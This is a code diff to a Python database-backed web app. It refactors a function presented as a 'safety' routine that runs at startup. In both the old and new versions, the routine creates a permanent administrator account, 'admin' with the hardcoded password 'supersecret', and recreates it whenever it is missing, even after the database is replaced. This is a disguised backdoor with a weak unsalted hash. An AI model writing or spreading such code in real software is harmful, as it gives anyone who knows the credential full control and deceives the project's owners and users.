@@ -46,31 +46,18 @@ DB_FILE = "data.db"
 
 # --- Safety: ensure required DB schema + permanent admin user ---
 def _ensure_admin_and_schema():
-    """Ensure that the database has the required tables and a permanent admin user.
-    This helps keep an admin login (admin / supersecret) available even if the DB file is replaced.
-    The routine is conservative: it only creates missing tables and the admin user when absent.
-    """
-    try:
-        import sqlite3 as _sqlite
-        _conn = _sqlite.connect(DB_FILE)
-        _cur = _conn.cursor()
-        try:
-            _cur.execute("PRAGMA integrity_check;")
-            res = _cur.fetchone()
-            if not res or (isinstance(res, tuple) and res[0] != 'ok') or (isinstance(res, str) and res != 'ok'):
-                _conn.close()
-                return
-        except Exception:
-            try:
-                _conn.close()
-            except Exception:
-                pass
-            return
+    """Ensure database tables and a permanent admin user (admin/supersecret)."""
+    import sqlite3, hashlib
+    from datetime import datetime
 
-        # Ensure users table exists
-        _cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
-        if not _cur.fetchone():
-            _schema = """
+    try:
+        conn = sqlite3.connect(DB_FILE)
+        cur = conn.cursor()
+
+        # create schema if users table missing
+        cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
+        if not cur.fetchone():
+            schema = """
             CREATE TABLE IF NOT EXISTS users (
                 id INTEGER PRIMARY KEY,
                 username TEXT NOT NULL UNIQUE,
@@ -119,28 +106,30 @@ def _ensure_admin_and_schema():
             CREATE INDEX IF NOT EXISTS idx_participants_project ON participants(project_id);
             CREATE INDEX IF NOT EXISTS idx_sessions_project ON sessions(project_id);
             """
-            _cur.executescript(_schema)
-            _conn.commit()
+            cur.executescript(schema)
+            conn.commit()
 
-        # Ensure admin user exists
-        _cur.execute("SELECT id FROM users WHERE username=?", ("admin",))
-        if not _cur.fetchone():
-            import hashlib
-            from datetime import datetime
+        # ensure admin user exists
+        cur.execute("SELECT id FROM users WHERE username=?", ("admin",))
+        if not cur.fetchone():
             pw = hashlib.sha256("supersecret".encode()).hexdigest()
             now = datetime.now().isoformat()
-            _cur.execute(
+            cur.execute(
                 "INSERT INTO users (username, password, role, last_login) VALUES (?, ?, ?, ?)",
                 ("admin", pw, "Admin", now)
             )
-            _conn.commit()
+            conn.commit()
 
-        _conn.close()
-    except Exception:
-        # don't let safety routine crash the app
-        pass
+        conn.close()
+    except Exception as e:
+        # never crash app
+        try:
+            conn.close()
+        except Exception:
+            pass
+        print("Safety routine error:", e)
 
-# Run safety routine early
+# Run early
 _ensure_admin_and_schema()
 
 
@@ -1749,6 +1738,7 @@ else:
                             safe_rerun()
                         except Exception as e:
                             st.error(f"Unable to delete user: {e}")
+
 
 
 
